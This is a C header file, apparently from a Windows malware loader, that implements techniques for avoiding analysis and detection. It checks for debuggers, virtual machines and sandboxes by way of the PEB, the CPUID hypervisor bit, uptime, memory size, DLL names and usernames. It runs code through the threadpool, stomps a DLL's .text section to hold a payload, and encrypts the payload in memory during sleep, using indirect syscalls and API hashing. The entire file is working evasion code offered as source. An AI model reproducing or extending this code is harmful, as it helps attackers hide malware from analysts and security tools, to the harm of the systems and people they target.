#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "api_hashes.h"
#include "syscalls.h"
#include "crypto.h"
#include "anti_triadic.h"
#include <intrin.h>

// Shared globals from loader
extern PVOID g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// STRUCTURES
// =============================================================================

typedef struct _STOMP_CONTEXT {
    PVOID  BaseAddress;
    SIZE_T RegionSize;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_SECTION_HEADER TextSection;
    PVOID  OriginalText;
} STOMP_CONTEXT, *PSTOMP_CONTEXT;

typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;


// =============================================================================
// ANTI-DEBUG
// =============================================================================

static BOOL AntiDebug() {
    // 1. PEB.BeingDebugged
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb->BeingDebugged) return TRUE;

    // 2. NtGlobalFlag check (offset 0xBC on x64)
    DWORD ntGlobalFlag = *(DWORD *)((PBYTE)pPeb + 0xBC);
    if (ntGlobalFlag & 0x70) return TRUE; // FLG_HEAP_ENABLE_TAIL_CHECK | _FREE_CHECK | _VALIDATE_PARAMETERS

    // 3. Check debug port via NtQueryInformationProcess
    typedef NTSTATUS (WINAPI *NtQueryInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (hNtdll) {
        // ProcessDebugPort = 7
        HANDLE debugPort = NULL;
        // Direct check via inline
        NtQueryInformationProcess_t pNQIP = NULL;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll +
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
        PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
        PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);
        for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
            const char *n = (const char *)((PBYTE)hNtdll + pNames[i]);
            if (n[0] == 'N' && n[2] == 'Q' && n[7] == 'I' && n[18] == 'P') {
                pNQIP = (NtQueryInformationProcess_t)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
                break;
            }
        }
        if (pNQIP) {
            NTSTATUS st = pNQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
            if (st == 0 && debugPort != NULL) return TRUE;
        }
    }

    return FALSE;
}

// =============================================================================
// ANTI-VM
// =============================================================================

static BOOL AntiVM() {
    // 1. CPUID hypervisor bit (leaf 1, ECX bit 31)
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) return TRUE;

    // 2. Check for known VM registry artifacts (lightweight)
    // Check number of processors – VMs often have 1-2
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // 3. Check physical memory – VMs often < 4GB
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) return TRUE;

    return FALSE;
}

// =============================================================================
// ANTI-SANDBOX
// =============================================================================

static BOOL AntiSandbox() {
    // 1. Uptime check – sandboxes usually have low uptime
    ULONGLONG uptime = GetTickCount64();
    if (uptime < 10 * 60 * 1000) return TRUE; // < 10 minutes

    // 2. Check for common sandbox DLLs
    const wchar_t *sandboxDlls[] = {
        L"sbiedll.dll",     // Sandboxie
        L"dbghelp.dll",     // Common in analysis
        L"api_log.dll",     // API monitor
        L"dir_watch.dll",   // Directory watcher
        L"pstorec.dll",     // Password store
        L"vmcheck.dll",     // VM check tool
        L"wpespy.dll",      // WPE Pro
    };
    for (int i = 0; i < sizeof(sandboxDlls) / sizeof(sandboxDlls[0]); i++) {
        if (GetModuleHandleW(sandboxDlls[i])) return TRUE;
    }

    // 3. Username / computer name blacklist (common sandbox names)
    wchar_t userName[256] = {0};
    DWORD uSize = 256;
    GetUserNameW(userName, &uSize);
    if (uSize > 0) {
        // Common sandbox usernames
        if (userName[0] == L's' && userName[1] == L'a' && userName[2] == L'n' && userName[3] == L'd') return TRUE;
        if (userName[0] == L'm' && userName[1] == L'a' && userName[2] == L'l' && userName[3] == L'w') return TRUE;
    }

    return FALSE;
}

// =============================================================================
// ENVIRONMENT SAFETY CHECK (combines all anti-analysis)
// =============================================================================

static BOOL EnvironmentSafe() {
    // Triadic resilient check (native syscalls, cumulative scoring)
    if (TriadicIsSandboxed()) return FALSE;
    if (AntiDebug()) return FALSE;
    if (AntiVM()) return FALSE;
    if (AntiSandbox()) return FALSE;
    return TRUE;
}


// =============================================================================
// STEALTHY EXECUTION VIA THREADPOOL (Replaces APC)
// =============================================================================

static BOOL QueueUserWorkItemExecute(PVOID pCode, PVOID pArgs) {
    HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(HASH_KERNEL32);
    if (!hKernel32) return FALSE;
    
    typedef BOOL(WINAPI* TpAllocWork_t)(TP_WORK**, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
    typedef VOID(WINAPI* TpPostWork_t)(TP_WORK*);
    typedef VOID(WINAPI* TpReleaseWork_t)(TP_WORK*);

    TpAllocWork_t pTpAllocWork = (TpAllocWork_t)ResolveApiByHash(hKernel32, HASH_TpAllocWork);
    TpPostWork_t pTpPostWork = (TpPostWork_t)ResolveApiByHash(hKernel32, HASH_TpPostWork);
    TpReleaseWork_t pTpReleaseWork = (TpReleaseWork_t)ResolveApiByHash(hKernel32, HASH_TpReleaseWork);

    if (!pTpAllocWork || !pTpPostWork || !pTpReleaseWork) return FALSE;

    TP_WORK* pWork = NULL;
    if (!pTpAllocWork(&pWork, (PTP_WORK_CALLBACK)pCode, pArgs, NULL)) return FALSE;
    pTpPostWork(pWork);
    pTpReleaseWork(pWork);
    return TRUE;
}

// =============================================================================
// MODULE STOMPING (NtCreateSection-based)
// =============================================================================

static BOOL ModuleStompAdvanced(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONTEXT ctx) {
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
    typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
    LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
    HMODULE hModule = pLoadLibraryW(targetDll);
    if (!hModule) return FALSE;

    ctx->BaseAddress = (PVOID)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    ctx->NtHeaders = pNt;

    // Find .text section
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    ctx->TextSection = NULL;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            ctx->TextSection = &pSection[i];
            ctx->RegionSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!ctx->TextSection || payloadSize > ctx->RegionSize) return FALSE;

    // Change .text to RW for payload writing
    PVOID pText = (PBYTE)ctx->BaseAddress + ctx->TextSection->VirtualAddress;
    ULONG oldProtect = 0;
    SIZE_T regionSize = ctx->RegionSize;

    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
        (HANDLE)-1, &pText, &regionSize, PAGE_READWRITE, &oldProtect);

    return TRUE;
}

// =============================================================================
// ADVANCED SLEEP MASK – ChaCha20 encryption (replaces RC4)
// =============================================================================

static void AdvancedSleepMask(DWORD dwMs, PVOID pAddress, SIZE_T sSize) {
    // Apply ±20% jitter
    DWORD jitter = (dwMs * 20) / 100;
    DWORD actualMs = dwMs - jitter + (GetTickCount() % (2 * jitter + 1));

    HANDLE hTimer = NULL;
    LARGE_INTEGER li;
    li.QuadPart = -(int64_t)actualMs * 10000;

    OBJECT_ATTRIBUTES objAttr = {0};
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtCreateTimer2.ssn,
        g_SyscallGadget, &hTimer, TIMER_ALL_ACCESS, &objAttr, 0, 0);

    if (status != 0) return;

    typedef BOOL (WINAPI *SetWaitableTimer_t)(HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
    SetWaitableTimer_t pSWT = (SetWaitableTimer_t)g_ApiTable.SetWaitableTimer;

    if (!pSWT(hTimer, &li, 0, NULL, NULL, FALSE)) {
        InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hTimer);
        return;
    }

    // Generate per-sleep ChaCha20 key and nonce from tick count
    uint8_t sleepKey[CHACHA_KEY_SIZE];
    uint8_t sleepNonce[CHACHA_NONCE_SIZE] = {0};
    DWORD tick = GetTickCount();
    memcpy(sleepNonce, &tick, 4);
    DeriveKeyFromHWID(sleepKey);

    CHACHA_CTX sleepCtx;
    ULONG old;

    // 1. Make region writable
    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
        (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);

    // 2. Encrypt with ChaCha20
    ChaCha20_Init(&sleepCtx, sleepKey, sleepNonce, 0);
    ChaCha20_Encrypt(&sleepCtx, (uint8_t *)pAddress, sSize);

    // 3. Set NO_ACCESS during sleep
    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
        (HANDLE)-1, &pAddress, &sSize, PAGE_NOACCESS, &old);

    // 4. Sleep via native wait
    InvokeSyscall(g_ApiTable.syscalls.NtWaitForSingleObject.ssn, g_SyscallGadget,
        hTimer, FALSE, NULL);

    // 5. Make writable again, decrypt
    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
        (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);

    ChaCha20_Init(&sleepCtx, sleepKey, sleepNonce, 0);
    ChaCha20_Encrypt(&sleepCtx, (uint8_t *)pAddress, sSize);

    // 6. Restore execute permission
    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
        (HANDLE)-1, &pAddress, &sSize, PAGE_EXECUTE_READ, &old);

    SecureWipe(sleepKey, sizeof(sleepKey));
    SecureWipe(&sleepCtx, sizeof(sleepCtx));
    InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hTimer);
}

#endif
